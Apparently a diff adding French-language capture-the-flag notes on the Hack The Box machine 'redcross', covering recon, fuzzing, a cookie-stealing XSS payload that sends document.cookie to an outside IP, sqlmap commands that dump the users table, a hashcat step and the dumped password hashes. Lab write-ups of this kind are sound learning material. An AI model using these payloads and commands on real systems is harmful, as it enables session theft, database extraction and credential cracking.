@@ -1,0 +1,48 @@
+0/ fichier /etc/hosts
+
+1/ nmap -> 80,443,22
+
+2/ certificat -> penelope@redcross.htb
+
+3/ fuff => ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://intra.redcross.htb/FUZZ -c -v -fc 404,400,301
+	https://intra.redcross.htb/documentation/account-signup.pdf
+
+4/ login.php -> guest/guest	-> On est co mais Osef
+
+5/ faille web -> page de contact ->
+	Payload : <script>var myimg = new Image(); myimg.src = 'http://10.10.16.6/q?=' + document.cookie;</script>
+
+	On ajoute les cookies :	LANG=EN_US;%20SINCE=1667840531;%20LIMIT=10;%20DOMAIN=admin
+
+	4 users : 
+		admin
+		penelope
+		charles
+		guest
+
+	on utile le filtre : 2 parametres disponible :
+		https://intra.redcross.htb/?o=2&page=app
+
+6/ burpsuite : login.req
+
+		SQLMAP : 
+			sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -T users --dbs
+
+			sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross --tables
+
+			sqlmap -r login.req --risk=3 -p o --dbms=mysql --random-agent --delay=1.0 --technique=UE -D redcross -T users --dump
+
+	hashcat -a 0 -m 3200 
+
+		Database: redcross
+			Table: users
+			[5 entries]
+			+----+------------------------------+------+--------------------------------------------------------------+----------+
+			| id | mail                         | role | password                                                     | username |
+			+----+------------------------------+------+--------------------------------------------------------------+----------+
+			| 1  | admin@redcross.htb           | 0    | $2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq. | admin    |
+			| 2  | penelope@redcross.htb        | 1    | $2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS | penelope |
+			| 3  | charles@redcross.htb         | 1    | $2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i | charles  |
+			| 4  | tricia.wanderloo@contoso.com | 100  | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | tricia   |
+			| 5  | non@available                | 1000 | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | guest    |
+			+----+------------------------------+------+--------------------------------------------------------------+----------+
